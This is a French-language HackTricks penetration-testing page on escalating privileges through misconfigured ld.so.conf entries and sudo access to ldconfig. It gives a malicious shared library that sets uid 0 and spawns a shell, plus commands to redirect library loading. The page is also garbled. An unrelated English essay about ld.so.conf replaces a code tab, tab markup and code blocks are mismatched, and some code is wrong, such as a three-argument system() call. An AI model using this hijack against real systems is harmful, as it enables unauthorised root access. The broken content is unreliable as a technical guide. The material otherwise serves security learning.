## Exemple d'exploitation de privilège ld.so

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Préparer l'environnement

Dans la section suivante, vous pouvez trouver le code des fichiers que nous allons utiliser pour préparer l'environnement

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Welcome to my amazing application!\n");
    vuln_func();
    return 0;
}
```
{% endtab %}

{% tab title="ld.so.conf Example" %}
# ld.so.conf Example

This file is used by the dynamic linker/loader (`ld-linux.so`) to determine the libraries that need to be loaded for a given executable. By default, it looks for this file in `/etc/ld.so.conf` and any files in the `/etc/ld.so.conf.d/` directory.

The format of the file is simple: each line contains the path to a directory containing shared libraries. Lines starting with a `#` are treated as comments.

Here's an example `ld.so.conf` file:

```
# libc default configuration
/usr/local/lib

# additional libraries
/opt/custom/lib
```

This file tells the dynamic linker to look for shared libraries in `/usr/local/lib` and `/opt/custom/lib`. If you install a new library in one of these directories, you don't need to update any environment variables or configuration files; the dynamic linker will automatically find it.

Note that changes to this file will not take effect until you run `ldconfig` as root. This command updates the cache used by the dynamic linker to speed up library loading. If you forget to run `ldconfig` after modifying `ld.so.conf`, your changes will not be visible to the dynamic linker.

## LD_LIBRARY_PATH

In addition to `ld.so.conf`, you can also use the `LD_LIBRARY_PATH` environment variable to specify additional directories containing shared libraries. This variable takes precedence over `ld.so.conf`, so be careful when using it.

For example, if you set `LD_LIBRARY_PATH=/opt/custom/lib`, the dynamic linker will look for shared libraries in `/opt/custom/lib` before looking in any directories specified in `ld.so.conf`.

## Security Implications

If an attacker can modify the `ld.so.conf` file or the `LD_LIBRARY_PATH` environment variable, they can potentially execute arbitrary code with the privileges of any user that runs a setuid/setgid binary that uses a library from the modified directory.

This is known as a [library preloading attack](https://www.owasp.org/index.php/Dynamic_Linking#Library_Preloading_.28aka_.22Binary_Hijacking.22.29), and it can be used to bypass security controls and gain elevated privileges.

To prevent this type of attack, you should ensure that the `ld.so.conf` file and the `LD_LIBRARY_PATH` environment variable are only writable by trusted users, and that any setuid/setgid binaries are carefully audited to ensure that they do not use libraries from untrusted directories.

## References

- [ld.so(8) man page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) man page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [Dynamic Linking on the Linux Platform](https://www.ibm.com/developerworks/library/l-dynamic-libraries/)
- [Library Preloading (aka "Binary Hijacking")](https://www.owasp.org/index.php/Dynamic_Linking#Library_Preloading_.28aka_.22Binary_Hijacking.22.29)
{% endtab %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="ld.so.conf" %}
# Custom libraries path
/home/user/custom-libs
{% endtab %}
{% tab title="ld.so.conf.d/custom.conf" %}
# Custom libraries path
/home/user/custom-libs
{% endtab %}

{% tab title="ld.so.preload" %}
/lib/custom-lib.so
{% endtab %}
{% tab title="ld.so.cache" %}
/home/user/custom-libs/libcustom.so
{% endtab %}
{% tab title="ld.so.conf.d/other.conf" %}
/usr/local/lib
{% endtab %}
{% endtabs %}

Le fichier `ld.so.conf` est utilisé pour spécifier les chemins de recherche des bibliothèques partagées. Si un chemin est ajouté à ce fichier, les bibliothèques partagées qu'il contient seront disponibles pour tous les programmes exécutés sur le système. Le fichier `ld.so.conf.d/custom.conf` est un exemple de fichier de configuration supplémentaire qui peut être utilisé pour ajouter des chemins de bibliothèques personnalisées. Le fichier `ld.so.preload` est utilisé pour spécifier les bibliothèques partagées qui doivent être chargées avant toutes les autres bibliothèques. Le fichier `ld.so.cache` est utilisé pour stocker les informations de cache sur les bibliothèques partagées disponibles sur le système. Le fichier `ld.so.conf.d/other.conf` est un exemple de fichier de configuration supplémentaire qui peut être utilisé pour ajouter des chemins de bibliothèques supplémentaires.
```c
#include <stdio.h>

void vuln_func()
{
    puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **Créez** ces fichiers sur votre machine dans le même dossier
2. **Compilez** la **bibliothèque**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copiez** `libcustom.so` dans `/usr/lib`: `sudo cp libcustom.so /usr/lib` (privilèges root)
4. **Compilez** l'**exécutable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Vérifiez l'environnement

Vérifiez que _libcustom.so_ est **chargé** depuis _/usr/lib_ et que vous pouvez **exécuter** le binaire.
```
$ ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
	
$ ./sharedvuln 
Welcome to my amazing application!
Hi
```
## Exploitation

Dans ce scénario, nous allons supposer que **quelqu'un a créé une entrée vulnérable** dans un fichier situé dans _/etc/ld.so.conf/_ :
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Le dossier vulnérable est _/home/ubuntu/lib_ (où nous avons un accès en écriture).\
**Téléchargez et compilez** le code suivant à l'intérieur de ce chemin :
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("/bin/sh",NULL,NULL);
}
```
Maintenant que nous avons **créé la bibliothèque malveillante libcustom à l'intérieur du chemin mal configuré**, nous devons attendre un **redémarrage** ou que l'utilisateur root exécute **`ldconfig`** (_dans le cas où vous pouvez exécuter cette binaire en tant que **sudo** ou qu'elle a le **bit suid**, vous pourrez l'exécuter vous-même_).

Une fois que cela s'est produit, **revérifiez** où l'exécutable `sharevuln` charge la bibliothèque `libcustom.so` à partir de :
```c
$ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffeee766000)
	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Comme vous pouvez le voir, il se charge depuis `/home/ubuntu/lib` et si un utilisateur l'exécute, un shell sera exécuté:
```c
$ ./sharedvuln 
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Notez que dans cet exemple, nous n'avons pas escaladé les privilèges, mais en modifiant les commandes exécutées et **en attendant que root ou un autre utilisateur privilégié exécute le binaire vulnérable**, nous pourrons escalader les privilèges.
{% endhint %}

### Autres mauvaises configurations - Même vulnérabilité

Dans l'exemple précédent, nous avons simulé une mauvaise configuration où un administrateur **a défini un dossier non privilégié dans un fichier de configuration à l'intérieur de `/etc/ld.so.conf.d/`**.\
Mais il existe d'autres mauvaises configurations qui peuvent causer la même vulnérabilité, si vous avez des **permissions d'écriture** dans un **fichier de configuration** à l'intérieur de `/etc/ld.so.conf.d`, dans le dossier `/etc/ld.so.conf.d` ou dans le fichier `/etc/ld.so.conf`, vous pouvez configurer la même vulnérabilité et l'exploiter.

## Exploit 2

**Supposons que vous avez des privilèges sudo sur `ldconfig`**.\
Vous pouvez indiquer à `ldconfig` **où charger les fichiers de configuration à partir de**, nous pouvons donc en profiter pour faire charger à `ldconfig` des dossiers arbitraires.\
Alors, créons les fichiers et dossiers nécessaires pour charger "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Maintenant, comme indiqué dans l'**exploit précédent**, **créez la bibliothèque malveillante à l'intérieur de `/tmp`**.\
Et enfin, chargeons le chemin et vérifions d'où le binaire charge la bibliothèque:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007fffa2dde000)
	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Comme vous pouvez le voir, en ayant des privilèges sudo sur `ldconfig`, vous pouvez exploiter la même vulnérabilité.**

{% hint style="info" %}
Je n'ai **pas trouvé** de moyen fiable d'exploiter cette vulnérabilité si `ldconfig` est configuré avec le **bit suid**. L'erreur suivante apparaît : `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## Références

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Machine Dab dans HTB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
